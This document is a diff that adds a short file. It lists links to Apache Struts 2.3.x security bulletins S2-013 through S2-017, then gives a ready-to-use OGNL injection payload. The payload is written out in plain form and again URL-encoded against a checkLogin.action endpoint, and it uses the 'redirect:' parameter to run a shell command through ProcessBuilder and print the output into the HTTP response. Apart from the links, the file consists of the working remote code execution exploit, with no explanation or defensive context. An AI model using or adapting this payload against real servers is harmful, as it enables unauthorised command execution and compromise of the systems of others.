@@ -1,0 +1,21 @@
+
+http://struts.apache.org/release/2.3.x/docs/s2-013.html
+http://struts.apache.org/release/2.3.x/docs/s2-014.html
+http://struts.apache.org/release/2.3.x/docs/s2-015.html
+http://struts.apache.org/release/2.3.x/docs/s2-016.html
+http://struts.apache.org/release/2.3.x/docs/s2-017.html 
+
+=================================================================================
+
+redirect:${
+#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'pwd'})).start(),
+#b=#a.getInputStream(),
+#c=new java.io.InputStreamReader(#b),
+#d=new java.io.BufferedReader(#c),
+#e=new char[50000],
+#d.read(#e),
+#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),
+#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()
+}
+
+checkLogin.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'pwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
